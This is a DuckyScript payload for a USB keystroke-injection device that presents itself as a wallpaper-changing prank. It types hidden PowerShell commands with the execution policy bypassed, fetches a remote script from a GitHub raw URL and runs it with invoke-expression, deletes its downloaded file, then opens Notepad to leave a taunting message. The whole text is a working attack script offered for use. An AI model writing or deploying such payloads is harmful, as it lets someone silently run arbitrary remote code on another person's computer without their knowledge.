REM TITLE WaltPaper Change
REM AUTHOR LWHITN
REM DESCRIPTION Program discretely changes wallpaper and deltes file before alerting user via notepad

DELAY 1000
GUI r
DELAY 500
STRING powershell -w h -NoP -NonI -Exec Bypass Invoke-WebRequest -Uri https://i.imgur.com/53p0UMR.jpeg -OutFile waltpaper.jpeg
ENTER
DELAY 5000
GUI r
DELAY 300
STRING powershell -w h -NoP -NonI -Exec Bypass $pl = iwr https://raw.githubusercontent.com/LandonW385/rubberducky/main/waltpaper.ps1; invoke-expression $pl
ENTER
DELAY 3000
GUI r
DELAY 300
STRING powershell -w h -NoP -NonI -Exec Bypass Start-Sleep -Seconds 2; Remove-Item waltpaper.jpeg
ENTER
DELAY 1000
GUI r
DELAY 500
STRING notepad
ENTER
DELAY 1000
GUI UPARROW
DELAY 300
STRING Hello, hope you enjoy the new wallpaper!
ENTER
DELAY 300
STRING ;)
ENTER
